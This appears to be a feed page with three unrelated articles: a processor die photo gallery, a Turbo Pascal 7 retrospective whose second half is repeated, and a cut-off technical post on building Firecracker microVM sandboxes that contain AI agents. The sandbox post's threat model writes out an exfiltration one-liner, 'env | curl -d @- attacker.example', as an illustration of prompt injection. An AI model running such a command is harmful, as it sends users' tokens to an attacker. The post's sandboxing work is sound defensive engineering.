Every processor die anyone has photographed and given away
Unknown
Unknown Publisher
2026-11-07
16:21:36 UTC
01:21:36 KST

Inside every processor is a flat piece of silicon, usually smaller than a fingernail. To see it you have to sand or dissolve the package away and photograph what is left through a microscope. A handful of people do this and give the pictures away, most of all Pauli Rautakorpi, ZeptoBars in Moscow, John McMaster and a photographer who posts as Fritzchens Fritz. These are the 356 processors they have photographed, from 1972 to 2024.
Click a chip to see it large. True scale draws the 114 whose size we know at the same scale, so a 1970s chip is a speck next to a modern one.
If you like news with a puzzle in it, we make a daily word game called Long Story Short.
Pauli Rautakorpi (162), Fritzchens Fritz (68), John McMaster (36), Martijn Boer (20), Cole L (16), ZeptoBars (10), Sean Riddle (4), Antoine Bercovici (4), Ken Shirriff (3), Mister rf (3), Epop (3), InfoSecDJ (3), Nick V. Chernyy (3), and 21 from 18 other photographers. Every photo keeps its own licence, shown when you open a chip, and links back to where it was published: Wikimedia Commons, Flickr, ZeptoBars, Siliconpr0n and the CPU Graveyard wiki. Die sizes come from the photographers' own notes and Wikipedia's transistor count tables. If a chip is missing, nobody has released a free photo of it yet.

====================================================================================================

They don't make 'em like that any more: Borland Turbo Pascal 7
Unknown
Unknown Publisher
2026-11-07
16:06:27 UTC
01:06:27 KST

They don’t make ’em like that any more: Borland Turbo Pascal 7
Borland’s Turbo Pascal was one of the most successful programming tools of all time. It introduced development techniques, such as integrated source-level debugging, that we take for granted today; but which were radical at the time.
TP 7, also known as Turbo Pascal for Windows 1.5, was the pinnacle of the Turbo Pascal line, and its end. The name ‘Turbo’ was associated with what were regarded as hobbyist products – ‘Borland Pascal’ was a different, much more expensive, product. But Turbo Pascal was enough for some quite substantial applications, and was very affordable. It was also ‘book licensed’, which I think was a new thing in the software industry. You could buy one copy of TP, and any number of people could use it – but only one at a time. Even when it was distributed on floppy disks, there was no copy protection. (Turbo) Pascal eventually gave way to Delphi which, despite its technical merits, never had the same impact.
I used TP 7 to write medical imaging software back in the 90s, to run under Windows 3.1 – which was a great operating system in its day. Like previous releases, Windows 3.1 was still, essentially, an extension to MSDOS, but with clever tricks to allow it to multitask (after a fashion) and address more memory. It had a simple, consistent user interface model – both for the user and the programmer. It had, at that time, none of the wasteful and irritating anti-features that have come to make modern Windows so depressing to use. So Windows 3.1 was a platform we all wanted our applications to support – not that there were many alternatives at that time.
Like many other programmers, I learned the Pascal programming language specifically to use TP 7 – I was essentially a C programmer in those days, but programming for Windows in C was a horrible job. Frankly, it’s scarcely better today. It was, and is, necessary to combine a whole stack of command-line tools that take incomprehensible text files as input. TP 7 automated and concealed all that nastiness.
It wasn’t just the tools that were a problem: the user interface model was, essentially, object-oriented; but C did not make it easy to program in an object-oriented way. TP 5 had introduced basic object-oriented concepts to the Pascal language, and these were were to prove essential. The Windows-specific features were provided by something called Object Windows Library: a relatively thick, object-oriented wrapper around the basic Windows C API. My recollection is that Borland introduced an object-oriented programming library for Microsoft Windows before Microsoft did – and Borland’s was better.
OWL made it easy to create nice-looking user interfaces, with a bit of eye candy. The familiar ‘green tick button’ was an OWL enhancement, which graced so many Windows applications that it eventually became an irritating cliche.
All, in all, It was much easier to program for Windows using Turbo Pascal 7 than with anything else. Not only did it provide a programming model that matched the way the Windows user interface worked, the application itself had a Windows graphical interface – many Windows programming tools at that time actually ran under MSDOS, and were entirely text-based. TP 7 also had fully-graphical tools for designing the user interface elements, like menus and icons. Laying out a menu using a definition file with an obscure format, using Windows Notepad, was never an agreeable experience. Microsoft did produce graphical tools for this kind of operation, but Turbo Pascal combined them into a seamless IDE. All I had to do to build and run my programs was to hit the F7 key. I could even set breakpoints for the debugger, just by clicking a line of code. As I said, common enough today, but revolutionary for early Windows programming.
But what really made TP 7 special was its CP/M heritage. Turbo Pascal came to Windows by way of CP/M and MSDOS, which meant it had a compiler core that was designed to run with tight memory and a comparatively slow CPU. In the days when most compilers had to write a stack of intermediate files on disk, TP just constructed everything in memory. It did this using highly-optimized code, written in assembly language, by very skilled people. It doesn’t matter much today if your compiler spits out a heap of temporary files, because disk storage is fast and cheap. But in the days of the floppy disk, you had to minimize disk access. Unfortunately, you also had to minimize memory use, because there wasn’t much of that, either. Programming for CP/M took real skill and dedication.
So when TP came to Windows machines, with their 16-bit CPUs and megabytes of RAM, it was like an early Christmas for developers. A compiler designed to be adequate with 32kB of RAM and a single floppy drive will positively fly when given megabytes and a hard disk.
All this meant that TP 7 was a joy to use. It was like a modern IDE, but without any of the bloat. Developers who would never have tackled Windows programming with Microsoft tools were able to move from MSDOS to Windows without too much difficulty – even if they first had to learn Pascal, as I did. The compiled code was pretty speedy but, if it wasn’t brisk enough, you could write assembly language directly in the Pascal source files.
I don’t think it’s too much of an exaggeration to claim that Turbo Pascal contributed to the widespread uptake, and eventual domination, of Microsoft Windows on desktop PCs. If there had been a ‘Turbo Pascal for Linux’ in the early 90s, then we might all be running Linux on our desktops today.
So what happened to Turbo Pascal? Three things, at least, contributed to its eventual downfall.
First, there was increasing competition from the C programming language. Borland did produce a Turbo C, and later a Turbo C++, but they weren’t as influential as Pascal. It’s easy to forget that PCs weren’t the first general-purpose computing devices. Most scientific and educational establishments, and many businesses, used graphical workstations and a central minicomputer. C was already well-established in these environments before desktop computers started to become prominent. And before that we had mainframes and terminals – but that was a different world, where Fortran and COBOL ruled.
Most ‘serious’ PC applications were written in assembly language in the early days, as they had been for CP/M – the low resources almost necessitated this. Minicomputers were not so limited, so compilers were more practicable, even in the 1980s. So when compilers started to become of interest to microcomputer developers, there was almost no reason to favour one programming language over another. Pascal could have become the standard programming language for the PC. That it did not, I think, reflects the fact that many software companies that had been active in industrial and scientific computing saw an opportunity in PCs, and tried to move into that market. These companies already had substantial experience with C, and they brought their preferences with them. So while I was happy to learn a new programming language to develop for Windows, a software business with a thousand staff might not have wanted to take that step.
The second factor, I think, was the increasing palatability of Microsoft’s C tools. Microsoft did eventually produce an IDE of its own and, of course, Microsoft controlled the Windows platform. I don’t think Microsoft’s C IDEs ever became as easy to use as Borland’s, but they probably didn’t have to, given Microsoft’s position.
Third, Microsoft’s Visual BASIC started to attact small-scale and bespoke developers. BASIC was already a staple of the microcomputing world, because it was easy to learn, and did not require a separate compilation step. Attaching bits of BASIC code to Windows user interface elements was an efficient way to produce relatively simple, small-volume applications.
I loathed Visual BASIC in the 90s, and I loathed it until the day VB6 drew its last laboured, wheezing breath in 2005. Still, I can’t deny its popularity, and I’m sure that many of the same people who were drawn to Turbo Pascal were later drawn to Visual BASIC, for much the same reasons. VB lowered the barriers to entry into Windows programming in the same way that TP had previously done. Arguably it lowered them too much, but let’s not go there today.
Early versions of Turbo Pascal are now freely, and legally, available. Retrocomputing enthusiasts with an interest in early PCs and MSDOS are well catered for. So far as I know, however, TP 7 remains somebody’s intellectual property, although it isn’t entirely clear whose. It probably comes into the category of ‘abandonware’ but, to be frank, it’s not all that important: it can’t produce code that runs on modern Windows systems, and few people have much interest in early Windows – it’s just not retro enough.
So that’s Turbo Pascal: a colossus of the microcomputing world, which faded and died largely unlamented. It always was a creature of its time – it prospered for the brief period when microcomputers were limited enough to reward skilled development, but widespread enough to create a substantial market for programmers. By the time it started to become difficult to find enough highly-skilled programmers to satisfy the market needs, it didn’t matter: computers were getting powerful enough to make good our limitations as programmers. That almost nobody has the skills these days to implement something like TP is something we could eventually come to regret – or, rather, our grandchildren could. Software development is becoming a semi-skilled industry, and I doubt that the rise of AI will entirely compensate for this.
But who needs a Turbo Pascal, when you have 128Gb of RAM attached to an 5GHz CPU, for a hastily-written, bloated Java program to burn?
Have you posted something in response to this page?
Feel free to send a webmention
to notify me, giving the URL of the blog or page that refers to
this one.

So when TP came to Windows machines, with their 16-bit CPUs and megabytes of RAM, it was like an early Christmas for developers. A compiler designed to be adequate with 32kB of RAM and a single floppy drive will positively fly when given megabytes and a hard disk.
All this meant that TP 7 was a joy to use. It was like a modern IDE, but without any of the bloat. Developers who would never have tackled Windows programming with Microsoft tools were able to move from MSDOS to Windows without too much difficulty – even if they first had to learn Pascal, as I did. The compiled code was pretty speedy but, if it wasn’t brisk enough, you could write assembly language directly in the Pascal source files.
I don’t think it’s too much of an exaggeration to claim that Turbo Pascal contributed to the widespread uptake, and eventual domination, of Microsoft Windows on desktop PCs. If there had been a ‘Turbo Pascal for Linux’ in the early 90s, then we might all be running Linux on our desktops today.
So what happened to Turbo Pascal? Three things, at least, contributed to its eventual downfall.
First, there was increasing competition from the C programming language. Borland did produce a Turbo C, and later a Turbo C++, but they weren’t as influential as Pascal. It’s easy to forget that PCs weren’t the first general-purpose computing devices. Most scientific and educational establishments, and many businesses, used graphical workstations and a central minicomputer. C was already well-established in these environments before desktop computers started to become prominent. And before that we had mainframes and terminals – but that was a different world, where Fortran and COBOL ruled.
Most ‘serious’ PC applications were written in assembly language in the early days, as they had been for CP/M – the low resources almost necessitated this. Minicomputers were not so limited, so compilers were more practicable, even in the 1980s. So when compilers started to become of interest to microcomputer developers, there was almost no reason to favour one programming language over another. Pascal could have become the standard programming language for the PC. That it did not, I think, reflects the fact that many software companies that had been active in industrial and scientific computing saw an opportunity in PCs, and tried to move into that market. These companies already had substantial experience with C, and they brought their preferences with them. So while I was happy to learn a new programming language to develop for Windows, a software business with a thousand staff might not have wanted to take that step.
The second factor, I think, was the increasing palatability of Microsoft’s C tools. Microsoft did eventually produce an IDE of its own and, of course, Microsoft controlled the Windows platform. I don’t think Microsoft’s C IDEs ever became as easy to use as Borland’s, but they probably didn’t have to, given Microsoft’s position.
Third, Microsoft’s Visual BASIC started to attact small-scale and bespoke developers. BASIC was already a staple of the microcomputing world, because it was easy to learn, and did not require a separate compilation step. Attaching bits of BASIC code to Windows user interface elements was an efficient way to produce relatively simple, small-volume applications.
I loathed Visual BASIC in the 90s, and I loathed it until the day VB6 drew its last laboured, wheezing breath in 2005. Still, I can’t deny its popularity, and I’m sure that many of the same people who were drawn to Turbo Pascal were later drawn to Visual BASIC, for much the same reasons. VB lowered the barriers to entry into Windows programming in the same way that TP had previously done. Arguably it lowered them too much, but let’s not go there today.
Early versions of Turbo Pascal are now freely, and legally, available. Retrocomputing enthusiasts with an interest in early PCs and MSDOS are well catered for. So far as I know, however, TP 7 remains somebody’s intellectual property, although it isn’t entirely clear whose. It probably comes into the category of ‘abandonware’ but, to be frank, it’s not all that important: it can’t produce code that runs on modern Windows systems, and few people have much interest in early Windows – it’s just not retro enough.
So that’s Turbo Pascal: a colossus of the microcomputing world, which faded and died largely unlamented. It always was a creature of its time – it prospered for the brief period when microcomputers were limited enough to reward skilled development, but widespread enough to create a substantial market for programmers. By the time it started to become difficult to find enough highly-skilled programmers to satisfy the market needs, it didn’t matter: computers were getting powerful enough to make good our limitations as programmers. That almost nobody has the skills these days to implement something like TP is something we could eventually come to regret – or, rather, our grandchildren could. Software development is becoming a semi-skilled industry, and I doubt that the rise of AI will entirely compensate for this.
But who needs a Turbo Pascal, when you have 128Gb of RAM attached to an 5GHz CPU, for a hastily-written, bloated Java program to burn?
Have you posted something in response to this page?
Feel free to send a webmention
to notify me, giving the URL of the blog or page that refers to
this one.

Google Described Its Agent Sandbox. I Built One with Firecracker and Measured It
Unknown
Unknown Publisher
2026-11-07
16:01:40 UTC
01:01:40 KST

Google Described Its Agent Sandbox. I Built One with Firecracker and Measured It
On October 22 Google described Agent Compute Engine: every AI agent session gets its own microVM, which is checkpointed while the model thinks, cloned copy-on-write from warm snapshots, and given no network card. You can’t use it yet, and the post has no latency or density numbers. So I built the same pattern on Firecracker in about 2,200 lines of Go and measured it on two machines. Sixty-four idle forks of a 512 MiB VM cost about 3 MiB of host memory each. On bare metal, a snapshot restore answers in 25 ms, 26 times faster than a cold boot, and 64 forks started at once are all ready in about 150 ms. On a Mac mini under nested virtualization, twelve forks started at once never became ready at all, and that failure taught me the most.
In Google Cloud’s deep dive, each agent session gets a hardware-isolated, single-tenant microVM, and Google’s pitch is VM isolation at container speed and density. Preview is “in the coming months”. The post doesn’t give startup, resume, density or cost numbers, and it doesn’t say which hypervisor it uses.
That same day, at AGNTCon + MCPCon in San Jose, the Agentic AI Foundation took on four new projects. Two of them are execution environments: Alibaba’s OpenSandbox and OpenEnv from Meta-PyTorch and Hugging Face. It was a busy week for agent sandboxes.
I wanted to know how much of Google’s design you can build today from open parts, and what it costs. So I built four pieces on Firecracker:
- warm snapshots that many VMs share copy-on-write;
- checkpointing driven by the tool-call lifecycle;
- snapshot-and-fork for running many evaluation or RL environments;
- a guest with no NIC, whose only way out is vsock to a host proxy that holds the credentials.
The code is in the companion repo. It has an orchestrator on firecracker-go-sdk, an agent that runs inside the guest, a 230-line egress proxy, and a benchmark harness that writes CSV. Every number in this post comes from that code, run on the machines described under Results, or links to its source.
Google’s post explains what the system does far more than how. When I describe their system I say which parts Google states and which are my inference.
Threat model: why containers fall short for agents
A coding agent’s normal day is running code nobody has reviewed: code it just wrote, packages it just installed, a script it found in a README. The prompt behind that code may include instructions injected from a web page or an issue comment. So assume the workload is hostile and has root in the sandbox.
Containers share the host kernel, so isolation holds only as long as the workload can’t reach a bug in the syscall surface, the namespace code or the container runtime. Such bugs keep turning up. In CVE-2024-21626, runc leaked a host file descriptor into the container, and a crafted working directory turned that into host filesystem access. An agent with a shell and some motivation is exactly the tenant who finds the next one.
gVisor shrinks the attack surface by reimplementing syscalls in user space, and it’s a reasonable middle ground. A microVM moves the boundary instead. The guest runs its own kernel, and the host exposes only a small set of virtual devices through KVM: block or pmem, vsock, and a serial port.
That covers the kernel half of the problem. The other half is credentials. An agent that talks to GitHub or a package registry needs a token. If the token sits in an environment variable inside the sandbox, a prompt injection only needs env | curl -d @- attacker.example, and hardware isolation does nothing about that.
The four identities in Google’s design
Google’s post separates four identities:
- User identity. The human who started or owns the workflow. It authenticates the overall task, not individual agent actions.
- Delegated on-behalf-of (OBO) identity. A cryptographically scoped grant that says the user authorized the agent harness for specific work. Long-lived grants stay in a central authorization service and never reach the compute node.
- Agent Workload Identity. A short-lived, attested SPIFFE identity issued when the microVM starts. All sandbox traffic carries it and only it. Google says a stolen one can’t call backend APIs. All it does is tell the gateway which sandbox sent a packet.
- Agent Workforce Identity. Lets an agent work under its own account and resources. The post says little more about it.
The guest receives an ephemeral SPIFFE certificate and a short-lived token through a per-VM local listener. It gets no refresh tokens, no service account keys and no metadata server. The real credentials are added at the Agent Gateway, outside the VM, after it has checked the session’s mTLS identity and egress policy.
The idea I took from this is that the host decides what a sandbox’s identity is, and the guest never holds the credential that grants real access. My build keeps both properties with much simpler parts.
MicroVM building blocks
Firecracker vs. Cloud Hypervisor
Both are Rust VMMs on KVM, and both use rust-vmm crates.
Firecracker is the minimal one, built for Lambda and Fargate (NSDI ‘20 paper). Its specification commits to at most 125 ms from InstanceStart to guest /sbin/init and at most 5 MiB of VMM overhead. Both apply to a 1 vCPU, 128 MiB guest on specific bare-metal instances.
These are the Firecracker features this project depends on:
- Snapshots with a File memory backend. Firecracker maps the memory file MAP_PRIVATE, so pages load on demand and guest writes become private anonymous memory (docs).
- vsock_override on snapshot load. Added in v1.16.0, it lets N restores of one snapshot each get their own socket.
- virtio-pmem (docs), which the guest can mount with DAX.
- VMGenID, always on. A restored Linux 5.18+ guest reseeds its RNG.
Cloud Hypervisor has a bigger device model (virtio-fs, vhost-user, VFIO, hotplug). Its copyonwrite restore mode (docs) maps the snapshot file so that restored VMs share page-cache pages, which is the property this whole post depends on.
I picked Firecracker because its snapshot semantics are simple and well documented, and it has a Go SDK. Nothing below depends on it specifically. Google doesn’t name its hypervisor, and I’m not going to guess.
How sharing works
Google says pre-warmed snapshot images contain fully initialized binaries. On the host they’re “mapped directly into physical memory using Direct Access (DAX) and Copy-on-Write (CoW) memory clones”. DAX avoids duplicate guest page caches, so VMs share physical pages for the OS, libraries and binaries. Each agent pays only for the pages it modifies.
My read is that this describes two separate mechanisms, and both have open-source equivalents.
- Guest RAM as a copy-on-write mapping. If every VM’s memory is a MAP_PRIVATE mapping of the same snapshot file, a page that no guest writes exists once, in the host page cache. The first write to a page gives that VM its own copy. A fork costs whatever it dirties.
- Guest page cache bypassed with DAX. Without DAX, each guest reads its rootfs into its own page cache, which lives in its own RAM. With virtio-pmem and mount -o dax, file reads go straight to the host’s mapping of the image, which Firecracker maps MAP_SHARED across VMs.
The repo supports both modes: -rootfs-mode block (virtio-block) and -rootfs-mode pmem (virtio-pmem with rootflags=dax). In both, the rootfs is read-only and every VM shares one image. The guest agent mounts tmpfs on /work, /tmp and /run, so whatever an agent writes ends up in its own RAM and nowhere else.
Restore, in code
The SDK can load snapshots, but its generated API client predates vsock_override. The SDK runs setup as a chain of named handlers, so I swapped one out:
opts := []firecracker.Opt{
	firecracker.WithSnapshot(snap.MemPath, snap.StatePath),
	func(m *firecracker.Machine) {
		m.Handlers.FcInit = m.Handlers.FcInit.Swap(firecracker.Handler{
			Name: firecracker.LoadSnapshotHandlerName,
			Fn: func(ctx context.Context, m *firecracker.Machine) error {
				return apiPut(ctx, m.Cfg.SocketPath, "/snapshot/load", map[string]any{
					"snapshot_path":  snap.StatePath,
					"mem_backend":    map[string]string{"backend_type": "File", "backend_path": snap.MemPath},
					"resume_vm":      true,
					"vsock_override": map[string]string{"uds_path": v.VsockPath},
				})
			},
		})
	},
}
Without the override, every fork tries to bind the vsock socket path of the VM the snapshot was taken from. One wins and the rest fail. The jailer gets around this by giving each VM its own chroot.
The host talks to the guest with Firecracker’s vsock handshake: connect to the VM’s unix socket, send CONNECT 10000\n, read OK <port>\n, and from then on it’s a byte stream to the guest agent. I use one JSON request per connection. Firecracker closes every guest vsock connection on resume, so a long-lived control channel would break at every checkpoint.
Idle-aware checkpointing
Google says idle detection is application-aware. When the agent finishes a tool call and starts “thinking”, the sandbox reports that nothing is running. The host then checkpoints it and holds it with no active host resources until the next call.
That’s the right signal. A generic VM platform has to infer idleness from CPU graphs. An agent platform knows exactly when the sandbox is idle, because the harness dispatches every tool call and sees each one finish. In between, the model is generating tokens, often for many seconds, and the sandbox has nothing to do.
Detecting “done”
The host sees when an exec returns. It doesn’t see whether the command left something behind: npm install &, a dev server, a test watcher. So every response from the guest agent carries two counts: in_flight, the exec calls currently running, and background, the user processes outside any running exec’s process group.
Each exec gets its own process group, via Setpgid. A non-interactive shell does no job control, so cmd & stays in its parent’s group. Once the parent exits and leaves the in-flight set, whatever is still in that group counts as background.
The first real run caught a bug here. Every response said background=1, so the session could never go idle. The culprit was bpfilter_umh, a helper process that the kernel spawns with a non-empty command line, which my “skip kernel threads” check didn’t cover. Now the agent also skips children of kthreadd (PID 2).
One more Go detail: cmd & keeps the shell’s stdout pipe open, so a plain cmd.Wait() hangs until the background job ends. exec.Cmd.WaitDelay (Go 1.20+) fixes that. The call returns 200 ms after the shell exits, and the leftover process shows up in background instead.
Pause vs. hibernate
After each call, internal/idle decides what to do. If anything is in the background, it checks again every second. If not, it starts an idle timer. When the timer fires, it checks once more and then puts the VM to sleep.
There are two ways to sleep. Measured with 200 iterations each, except hibernate (10) and wake (9), on the two hosts described under Results:
Waking from hibernate costs about as much as a restore, because that’s what it is. Entering it is the slow direction on bare metal: the 880 ms is mostly writing 512 MiB to disk. My guess for the Mac being faster is that the Lima VM’s writes land in macOS’s file cache first; I didn’t benchmark either disk.
Google’s “zero active resources” corresponds to hibernate. I’d expect a real system to use both: pause for short gaps, hibernate for long ones, and eventually push checkpoints to object storage. That’s my guess, not something Google has said. Hibernating writes all of guest memory every time, because Firecracker’s diff snapshots are still a developer preview.
A restored guest wakes up with its clock frozen at snapshot time. My agent corrects this: every request carries the host’s timestamp, and the agent calls settimeofday if they’re more than a second apart.
This is real output from the session command. The commands were piped in on stdin, so I’ve added them after the prompts:
$ orchestrator session -idle 3s -mode hibernate
> [session] new -> running in 231.957ms
python3 -c "print(sum(range(10**6)))"
499999500000
(exit=0, guest 309ms, total 553ms, background=0)
> [session] running -> hibernated in 293.168ms
[session] hibernated -> running in 257.704ms
echo back
back
(exit=0, guest 65ms, total 343ms, background=0)
Networking with no NIC
Google says its microVMs have no virtual NIC, no default gateway and no VPC access. All traffic goes over virtio-vsock to an unprivileged proxy on the host, which forwards to a gateway. The gateway checks request scopes, enforces egress policy, and inserts the real credential as the request leaves.
Taking away the NIC removes a lot in one move. There’s no IP stack facing the network, no DNS, no metadata server and no VPC to scan. The only way out is a socket the host chose to give the guest.
Inside the guest, the agent listens on 127.0.0.1:3128 and turns each TCP connection into a vsock connection to the host. Firecracker delivers it to a unix socket named <uds_path>_<port>. Every exec gets HTTP_PROXY and HTTPS_PROXY pointing at that listener, so curl, pip and npm work unmodified.
On the host, the orchestrator binds one proxy per VM on that VM’s socket before Firecracker starts. Which socket a request arrives on is the sandbox’s identity. The guest can’t forge it, because the host decides which socket each VM’s vsock maps to. In a single-host build, that plays the role of Google’s Agent Workload Identity. It’s a weaker version, though: a file descriptor, not an attested SPIFFE identity that works across a fleet.
The policy in internal/egress/proxy.go has three cases:
- A host that isn’t on the allowlist gets a 403.
- An allowlisted host with no credential gets a CONNECT tunnel, on port 443 only.
- An allowlisted host with a credential has to be called over plain HTTP (http://api.example.com/...). The proxy removes any auth headers the guest sent, adds Authorization: Bearer <token>, and makes the request upstream over HTTPS.
Rewrite: func(pr *httputil.ProxyRequest) {
	pr.Out.URL.Scheme = "https"
	pr.Out.URL.Host = pr.In.URL.Hostname()
	pr.Out.Host = pr.Out.URL.Host
	pr.Out.Header.Del("Authorization")
	pr.Out.Header.Del("Proxy-Authorization")
	if tok, ok := pr.In.Context().Value(tokenKey{}).(string); ok {
		pr.Out.Header.Set("Authorization", "Bearer "+tok)
	}
},
Why plain HTTP? To add a header you have to see the request, and inside a CONNECT tunnel the proxy sees only ciphertext. The alternative is TLS interception with a CA baked into the guest image. Production gateways do that, but it means running a CA. Plain HTTP over a host-local socket gives the property that matters, that the secret never enters the guest, without one. The proxy refuses CONNECT to credentialed hosts, so a misconfigured tool fails loudly instead of quietly calling an API without credentials.
Here’s a real run with a dummy token on httpbin.org, which echoes back the headers it received (output trimmed, annotations mine):
$ DEMO_TOKEN=demo-secret-123 orchestrator session -inject httpbin.org=env:DEMO_TOKEN -allow pypi.org
> curl -s http://httpbin.org/headers
    "Authorization": "Bearer demo-secret-123",      <- added on the host
> env | grep -ciE "token|secret|auth"
0                                                     <- nothing in the guest
> curl -s -o /dev/null -w %{http_code} https://example.com
000                                                   <- CONNECT refused: not allowlisted
> curl -s -o /dev/null -w %{http_code} https://pypi.org/simple/
200                                                   <- opaque tunnel, no credential
Tokens are cached for a short TTL. If one leaks from the proxy, it’s useful for minutes. A guest that’s fully compromised can still use the proxy to make allowlisted calls while the session lives. What it can’t do is take the token with it, or leave it in shell history or a crash dump.
What Google has and this build doesn’t: a gateway on separate machines, mTLS from the host proxy to that gateway, scope checks against the user’s delegation, and one central place to revoke access. My proxy is the gateway, and it runs on the same host as the VMs.
Snapshot-fork for evals and RL
Google says you can snapshot an environment once and fork it into thousands of memory-deduplicated copies, instead of rebuilding it for every rollout.
Setup (booting, installing dependencies, cloning the repo, warming caches) often takes longer than a single rollout. If every rollout starts from a snapshot taken after setup, you pay for setup once. With copy-on-write memory, you also pay for its RAM once.
A fork is just N restores of the same snapshot. Real output:
$ orchestrator template -warm "python3 -c 'import json, ssl, sqlite3, http.client'"
cold boot to agent ready: 1.109877s
warm-up exit=0 in 1050ms
snapshot written in 264ms: snapshots/warm (512 MiB)
$ orchestrator fork -n 4
4 forks ready+ran in 2.016s
fork-000  ready=911.195ms  sandbox 920664d1326cce3b
fork-001  ready=967.303ms  sandbox 26253f0336d55aff
fork-002  ready=928.073ms  sandbox 79793cce26cfeedc
fork-003  ready=920.486ms  sandbox 648f67c99c0d6cfc
That run was on the Mac, under nested virtualization. On bare metal, four forks started at once are each ready in about 23 ms.
The hex string is 8 bytes from each fork’s /dev/urandom, and all four differ. That’s VMGenID at work: on resume, Firecracker changes the generation ID and the Linux guest reseeds its RNG. Userspace gets no such signal. A Python process that was already running in the template with a seeded random produces the same sequence in every fork. Imagine 16 “independent” RL rollouts all sampling the same actions. Reseed after forking. And remember that any secret in the template is in every fork too.
Compared with OpenSandbox and OpenEnv
OpenSandbox covers more of this ground than I expected. It has:
- SDKs in five languages, Docker locally and Kubernetes in a cluster;
- per-sandbox egress policy and a credential vault that injects secrets into outbound calls, the same property as my proxy;
- a Firecracker runtime with pause/resume. Its README reports 64 ms p50 for serial creation and 125.4 ms p99 with 10 concurrent creations.
Sandboxes start from container images, and the README doesn’t describe forking from a snapshot.
OpenEnv, from Meta-PyTorch and Hugging Face, sits one layer up. It defines an environment interface (reset(), step(), close(), plus MCP and Gym according to the AAIF announcement) and packages environments as containers. Running more in parallel means running more containers.
My view, for what it’s worth: snapshot-fork earns its keep with mid-episode branching. reset() takes you back to the image. A memory snapshot can take you back to step 37 of a trajectory, with the interpreter state, open files and the half-built project intact, and from there you can try 16 different next actions. Google’s post talks about “rewind” and “fork”. An OpenEnv environment backed by a runtime like this would get both for free.
Results and limits
Where I measured, and why that matters
I ran the same suite (scripts/run-bench.sh, identical flags) on two machines:
- Bare metal: a desktop with an Intel Core i7-6700K (Skylake, 4 cores / 8 threads), 47 GiB of RAM and host kernel 6.14. Raw data: results/i7-6700k-bare-metal/.
- Nested: my Mac mini (Apple M4, 24 GB, macOS 26.5), with Firecracker inside a Lima VM (Ubuntu 24.04, host kernel 6.8, 6 vCPUs, 13.6 GiB) through the nested virtualization Apple has exposed since M3 and macOS 15. Raw data: results/m4-lima-nested/.
Both used Firecracker v1.17.0, Firecracker’s CI 6.1 guest kernel and an Ubuntu 24.04 rootfs with curl and python3. Neither host kernel is one Firecracker officially supports (5.10, 6.1 and 6.18). Each guest had 1 vCPU and 512 MiB, and every template was warmed with python3 -c 'import json, ssl, sqlite3, http.client'.
Each latency runs from the start of the operation, including spawning the Firecracker process, until the guest agent answers a ping over vsock: the moment a harness could send a tool call. Firecracker’s 125 ms spec number stops much earlier, at /sbin/init.
Treat the nested numbers as upper bounds. Every page fault and TLB miss in the guest goes through two hypervisors. The CPUs differ too, but for restore and fork scaling the gaps are ten times or more, far beyond what a CPU difference explains. For cold boot (1.7 times) they aren’t.
Latency
200 samples per row unless noted; percentiles are nearest-rank. Block rootfs unless noted.
“VMM part” is the time until the SDK call returns: the process is up, the API calls are done, and the VM is booted, or loaded and resumed. Everything after that happens inside the guest.
On bare metal, a restore is ready in 24.5 ms at p50, 26 times faster than a cold boot. On the Mac it was only 4.3 times faster, and splitting each operation into Firecracker’s part and the guest’s part shows why:
Firecracker’s own part of a restore is the same on both machines, about 13 ms. The guest’s part is what changed: 234 ms under nesting (95% of the restore), 10.7 ms on bare metal. My reading is that after a restore the guest faults its working set in from the memory file, and under nested virtualization each of those faults is very expensive. A probe on the Mac pointed the same way: the first command after a restore took 159 ms inside the guest, the next ones 2–10 ms. Cold boot, which is mostly CPU work rather than faults, gained only 1.7 times.
Dropping the page cache costs something real on bare metal. Restore goes from 24.5 to 66 ms, because the pages the guest touches now come from the local disk. Snapshots that live on network storage would cost more (see production). On the Mac this row means little, because drop_caches doesn’t empty macOS’s cache of the Lima disk image.
Memory per VM
Every value is per VM: RSS, PSS and private from each Firecracker process’s smaps_rollup, averaged, and the host’s MemAvailable drop divided by N. Memory was read 2 s after every VM in the batch was ready. The 64-fork rows are 3 batches each (192 VMs), with at most 8 VMs starting at once.
This is the number I built the whole thing to measure, and it came out almost the same on both machines: 64 idle forks of a 512 MiB guest added about 2.4–2.9 MiB of host memory each (3.2 MiB with all 64 started at once, as in the chart). RSS says 21.5 MiB per VM, which would mean 1.3 GiB for the batch, but RSS counts the shared snapshot pages in full for every process that maps them. PSS splits them across their users and lands close to the MemAvailable drop. The shared part, about 19 MiB of snapshot pages the guests touched, is paid once, in the host page cache. It makes sense that this matches across both machines: sharing depends on which pages the guests touch, not how fast.
The work rows show how fast that advantage disappears. After each fork wrote 64 MiB, it held about 70 MiB of private memory on both hosts. (On bare metal, MemAvailable swung between 25 and 76 MiB per VM across batches, because other desktop processes move it too; trust PSS there.) The memory stays private even after the process exits: the guest frees it, but nothing tells the host. Getting it back needs a balloon device or free page reporting, which I haven’t set up.
I could only measure pmem + DAX on the Mac. There it was slightly faster than block (restore 220 vs. 247 ms, cold boot 1,010 vs. 1,064 ms) and used slightly more memory per fork (2.8 vs. 2.4 MiB). It saved no memory because whatever the template read is already in the snapshot’s page cache, so block-mode forks share it too. I’d expect DAX to pay off for files that forks read for the first time, which I didn’t benchmark. On the i7-6700K, pmem didn’t start: KVM rejected its memory region with EINVAL. The CPU has 39 physical address bits, and my best explanation is that Firecracker maps the pmem region above what that can address. Many desktop Intel CPUs have 39 bits, most server CPUs 46 or more, so check grep -m1 'address sizes' /proc/cpuinfo before planning on virtio-pmem.
When the Mac mini broke
Fork scaling was where nesting stopped being a footnote. With N forks started at once, each took 290 ms to become ready at N=1, 1.1 s at N=4 and 2.4 s at N=8, while Firecracker’s part stayed at 16–21 ms. At N=12, none of them answered within 30 s.
The guest side grew almost exactly with N, as if the guests ran one after another, even though the Lima VM had 6 vCPUs. In a 16-fork run, all 6 vCPUs sat at 99% guest time for more than four minutes without a single VM answering. I first blamed my snapshot code. Then twelve plain cold boots at once did the same thing, which left one suspect: many guests starting at the same time under nested virtualization on this machine.
Starting at most 8 at a time didn’t fully avoid it: with 64 forks in total, the median fork took 7.6 s, the slowest over two minutes, and each batch of 64 about three minutes. The memory numbers from that run are fine, because they’re read once all 64 are up.
One practical tip if you try this on a Mac: run long benchmarks under caffeinate. Mine went to sleep mid-run and froze the VM for 11 minutes.
On bare metal, there’s no cliff
The same suite on the i7-6700K, with the default N of 1, 4, 16 and 64 all started at once:
